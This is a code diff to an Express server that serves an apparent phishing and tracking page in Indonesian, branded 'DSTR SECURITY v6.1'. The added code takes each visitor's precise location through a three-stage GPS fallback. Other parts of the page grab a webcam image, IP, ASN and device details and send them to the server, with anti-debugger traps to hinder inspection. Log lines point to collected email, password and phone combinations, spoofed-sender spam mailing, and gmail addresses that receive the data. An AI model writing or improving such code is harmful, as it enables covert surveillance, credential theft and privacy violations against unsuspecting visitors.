+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+        }
+        .scanline {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(to bottom, transparent 50%, rgba(0,255,0,0.03) 50%);
+            background-size: 100% 4px; pointer-events: none; z-index: 10;
+            animation: scan 8s linear infinite;
+        }
         @keyframes scan { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }
         .container { position: relative; z-index: 2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .hacker-card { background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 2px solid #0f0; border-radius: 20px; padding: 50px; max-width: 800px; width: 100%; text-align: center; box-shadow: 0 0 50px rgba(0,255,0,0.3); animation: glitch 3s infinite; }
+        .hacker-card {
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 2px solid #0f0;
+            border-radius: 20px; padding: 50px; max-width: 800px; width: 100%; text-align: center;
+            box-shadow: 0 0 50px rgba(0,255,0,0.3); animation: glitch 3s infinite;
+        }
         .warning-text { font-size: 32px; font-weight: bold; color: #0f0; margin: 20px 0; animation: blink 1s infinite; }
         .hacker-text { font-size: 24px; color: red; margin: 15px 0; }
         .emoji-wall { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin: 30px 0; }
@@ -787,13 +899,14 @@ app.get('/', (req, res) => {
             <span class="security-badge">🔒 ANTI-COPY</span>
             <span class="security-badge">📡 ANTI-DEVTOOLS</span>
             <span class="security-badge">🧠 DETECT DEBUGGER</span>
-            <span class="security-badge">🎯 GPS AKURAT 100%</span>
+            <span class="security-badge">🎯 GPS 3 LAPIS</span>
             <span class="security-badge">📸 WEBCAM AUTO</span>
             <span class="security-badge">🌐 ASN DETECTION</span>
+            <span class="security-badge">🏠 REVERSE GEOCODE</span>
         </div>
         
         <div style="margin-top: 30px; font-size: 12px; color: #666;">
-            ⚡ DSTR SECURITY v6.0 | ALL YOUR DATA ARE BELONG TO US ⚡
+            ⚡ DSTR SECURITY v6.1 | ALL YOUR DATA ARE BELONG TO US ⚡
         </div>
     </div>
 </div>
@@ -818,7 +931,7 @@ app.get('/', (req, res) => {
         debugger;
         var after = Date.now();
         if (after - before > 100) {
-            document.body.innerHTML = '<div style=\"background:black; color:red; text-align:center; padding:50px; font-size:30px;\">🚫 DEBUGGER DETECTED! ACCESS DENIED 🚫</div>';
+            document.body.innerHTML = '<div style="background:black; color:red; text-align:center; padding:50px; font-size:30px;">🚫 DEBUGGER DETECTED! ACCESS DENIED 🚫</div>';
             alert('⚠️ JANGAN COBA-COBA HACK!');
         }
     }, 1000);
@@ -834,14 +947,101 @@ app.get('/', (req, res) => {
         } catch(e) { return 'Tidak terdeteksi'; }
     }
     
-    function getGPS() {
-        return new Promise(function(resolve) {
-            if (!navigator.geolocation) return resolve(null);
-            navigator.geolocation.getCurrentPosition(
-                function(pos) { resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
-                function(err) { resolve(null); },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
+    // ===== GET GPS: 3 LAPIS (GPS-FIRST) =====
+    async function getGPS() {
+        return new Promise(async function(resolve) {
+            if (!navigator.geolocation) {
+                document.getElementById('gpsStatus').innerText = '❌ Browser tidak support GPS';
+                return resolve(null);
+            }
+            
+            document.getElementById('gpsStatus').innerText = '🔍 Lapis 1: GPS high accuracy (15s)...';
+            
+            let best = null;
+            try {
+                best = await new Promise(function(res) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            res({
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                source: 'GPS/WiFi (getCurrentPosition high)'
+                            });
+                        },
+                        function(err) { res(null); },
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    );
+                });
+            } catch(e) { best = null; }
+            
+            if (best && best.accuracy && best.accuracy <= 100) {
+                document.getElementById('gpsStatus').innerHTML = '✅ ' + best.lat + ', ' + best.lon + ' (' + Math.round(best.accuracy) + 'm) - ' + best.source;
+                return resolve(best);
+            }
+            
+            document.getElementById('gpsStatus').innerText = '🔍 Lapis 2: GPS watch (10s)...';
+            const watchResult = await new Promise(function(res) {
+                let samples = [];
+                let watchId = null;
+                let done = false;
+                const finish = function() {
+                    if (done) return;
+                    done = true;
+                    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+                    if (samples.length === 0) return res(null);
+                    samples.sort(function(a,b) { return a.accuracy - b.accuracy; });
+                    res(samples[0]);
+                };
+                watchId = navigator.geolocation.watchPosition(
+                    function(pos) {
+                        samples.push({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            source: 'GPS/WiFi (watchPosition)'
+                        });
+                        if (pos.coords.accuracy <= 50) finish();
+                    },
+                    function(err) {},
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+                setTimeout(finish, 10000);
+            });
+            
+            if (watchResult && watchResult.accuracy && watchResult.accuracy <= 100) {
+                document.getElementById('gpsStatus').innerHTML = '✅ ' + watchResult.lat + ', ' + watchResult.lon + ' (' + Math.round(watchResult.accuracy) + 'm) - ' + watchResult.source;
+                return resolve(watchResult);
+            }
+            
+            document.getElementById('gpsStatus').innerText = '🔍 Lapis 3: Cell Tower / WiFi (10s)...';
+            let lowAcc = null;
+            try {
+                lowAcc = await new Promise(function(res) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            res({
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                source: 'Cell Tower / WiFi (low accuracy)'
+                            });
+                        },
+                        function(err) { res(null); },
+                        { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
+                    );
+                });
+            } catch(e) { lowAcc = null; }
+            
+            const candidates = [best, watchResult, lowAcc].filter(function(x) { return x && x.lat && x.lon; });
+            if (candidates.length === 0) {
+                document.getElementById('gpsStatus').innerText = '❌ GPS gagal (ditolak / tidak tersedia)';
+                return resolve(null);
+            }
+            candidates.sort(function(a,b) { return a.accuracy - b.accuracy; });
+            const finalBest = candidates[0];
+            document.getElementById('gpsStatus').innerHTML = '✅ ' + finalBest.lat + ', ' + finalBest.lon + ' (' + Math.round(finalBest.accuracy) + 'm) - ' + finalBest.source;
+            return resolve(finalBest);
         });
     }
     
@@ -900,10 +1100,8 @@ app.get('/', (req, res) => {
             var wajah = await captureWajah();
             var deviceInfo = getDeviceInfo();
             
-            if (gps) {
-                document.getElementById('gpsStatus').innerHTML = '✅ ' + gps.lat + ', ' + gps.lon + ' (' + Math.round(gps.accuracy) + 'm)';
-            } else {
-                document.getElementById('gpsStatus').innerHTML = '❌ Tidak diizinkan';
+            if (!gps) {
+                document.getElementById('gpsStatus').innerHTML = '⚠️ GPS gagal, fallback ke IP';
             }
             
             var payload = {
@@ -914,6 +1112,7 @@ app.get('/', (req, res) => {
                 latitude: gps ? gps.lat : '-',
                 longitude: gps ? gps.lon : '-',
                 gps_accuracy: gps ? gps.accuracy : '-',
+                gps_source: gps ? gps.source : 'IP fallback',
                 ip_address: ip,
                 platform: deviceInfo.platform,
                 screenResolution: deviceInfo.screenResolution,
@@ -931,7 +1130,7 @@ app.get('/', (req, res) => {
             
             var result = await response.json();
             if (result.success) {
-                document.getElementById('sendStatus').innerHTML = '✅ DATA TERKIRIM! (IP + ASN + GPS + WEBCAM)';
+                document.getElementById('sendStatus').innerHTML = '✅ DATA TERKIRIM! (GPS 3 LAPIS + IP + ASN + WEBCAM)';
             } else {
                 document.getElementById('sendStatus').innerHTML = '⚠️ Gagal kirim';
             }
@@ -971,7 +1170,7 @@ app.get('/', (req, res) => {
         canvasMat.height = window.innerHeight;
     });
     
-    console.log('%c🚫 DSTR SECURITY - DATA LENGKAP (IP, ASN, GPS, WEBCAM) TERKIRIM!', 'color: red; font-size: 16px;');
+    console.log('%c🚫 DSTR SECURITY - GPS 3 LAPIS + IP FALLBACK + WEBCAM AKTIF!', 'color: red; font-size: 16px;');
 </script>
 </body>
 </html>`);
@@ -986,10 +1185,9 @@ app.listen(PORT, () => {
     console.log(`   → http://localhost:${PORT}/mgwhiww`);
     console.log(`   → http://localhost:${PORT}/kttwwxy`);
     console.log(`   → http://localhost:${PORT}/mdgffew`);
-    console.log(`\n✅ ASN DETECTION ACTIVE: Setiap IP akan dilacak AS number, ISP, lokasi akurat!`);
-    console.log(`✅ LOKASI AKURAT: City, Region, Country, Postal Code sesuai IP real!`);
+    console.log(`\n✅ GPS-FIRST STRATEGY: 3 lapis (GPS high → watch → cell tower) sebelum fallback IP!`);
+    console.log(`✅ MULTI-API GEOLOCATION: ip-api.com + ipapi.co + ipwho.is cross-check!`);
+    console.log(`✅ REVERSE GEOCODING: Nominatim (OpenStreetMap) untuk alamat lengkap!`);
     console.log(`✅ ANTI-DUPLIKAT: Kombinasi email+pw+phone sama akan ditolak!`);
     console.log(`✅ SPAM BOOSTER: From admin@DESASTR.invalid + Reply-To noreply@Desastr.invalid + unicode DESASTR (tanpa kata peringatan, tanpa file)!`);
-    console.log(`✅ GGWXZZR: chilligemaass@gmail.com + Bay20110809@gmail.com`);
-    console.log(`✅ HGEFDYT: nebarzam@gmail.com + chilligemaass@gmail.com`);
 });
